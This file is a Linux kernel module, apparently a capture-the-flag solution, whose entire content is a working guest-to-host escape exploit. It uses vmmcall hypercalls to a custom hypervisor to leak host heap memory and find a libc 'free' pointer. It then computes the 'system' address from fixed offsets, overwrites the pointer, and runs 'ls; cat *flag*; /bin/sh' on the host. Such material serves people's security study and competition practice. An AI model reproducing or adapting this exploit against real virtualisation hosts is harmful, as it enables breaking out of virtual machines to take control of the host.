#include <linux/init.h> 
#include <linux/module.h>       
#include <linux/device.h>         
#include <linux/kernel.h>         
#include <linux/fs.h>             
#include <linux/uaccess.h> 
#include <linux/slab.h>
#define BUFSIZE 0x100000

MODULE_LICENSE("GPL"); 
MODULE_AUTHOR("BrieflyX");
MODULE_DESCRIPTION("Pwn kernel module"); 
MODULE_VERSION("0.1");

static char *gbuf = NULL;

static long hcall(int nr, uint64_t arg1, uint64_t arg2, uint64_t arg3) {
  long ret;
  asm volatile ( "movl %1, %%eax\n"
      "movq %2, %%rdi\n"
      "movq %3, %%rsi\n"
      "movq %4, %%rdx\n"
      "vmmcall\n"
      "mov %%rax, %0\n"
      :"=r"(ret)       /* output */
      :"r"(nr), "r"(arg1), "r"(arg2), "r"(arg3) /* input */
      :"%eax", "%rdi", "%rsi", "%rdx"           /* clobbered register */
    );
  return ret;
}

long alloc(uint64_t size) {
  return hcall(3, size, 0, 0);
}

long write_to_host(void * addr, uint64_t size) {
  return hcall(1, addr, size, 0);
}

long read_from_host(void * addr, uint64_t size) {
  return hcall(2, addr, size, 0);
}

static int __init pwn_init(void){
  printk(KERN_INFO "Exploit begins\n");

  gbuf = kmalloc(BUFSIZE, GFP_KERNEL);
  uint64_t addr = virt_to_phys(gbuf);
  printk(KERN_INFO "[+] Physical address 0x%lx\n", addr);

  int bufsize = 0x8000;
  uint64_t free = 0;
  uint64_t system = 0;
  uint64_t i, idx = 0;
  uint64_t *arr = (uint64_t *)gbuf;

  alloc(0x17);
  read_from_host(addr, bufsize);

  // Search heap
  for (i = 0; i < (bufsize / 8) - 3; i++) {
    // printk(KERN_INFO "arr[%d]=%llx\n", i, arr[i]);
    if (arr[i] == 0x24 && arr[i+1] == 0x17) {
      if ((arr[i+2] >> 40) == 0x7f) {
        printk(KERN_INFO "Find one 0x%lx\n", arr[i+2]);
        free = arr[i+2];
        idx = i+2;
        break;
      }
    }
  }

  if (free != 0) {
    // Pwn it!
    system = free - 0x97950 + 0x4f440;
    printk(KERN_INFO "System @ %lx\n", system);
    arr[idx] = system;
    strcpy(gbuf, "ls; cat *flag*; /bin/sh\0");

    write_to_host(addr, bufsize);

    // Trigger system
    hcall(4, 0, 0, 0);
    return 0;

  } else {
    printk(KERN_INFO "Exploit failed!\n");
  }

  return 0;
}

static void __exit pwn_exit(void){
   printk(KERN_INFO "pwn: Goodbye from the LKM!\n");
}

module_init(pwn_init);
module_exit(pwn_exit);
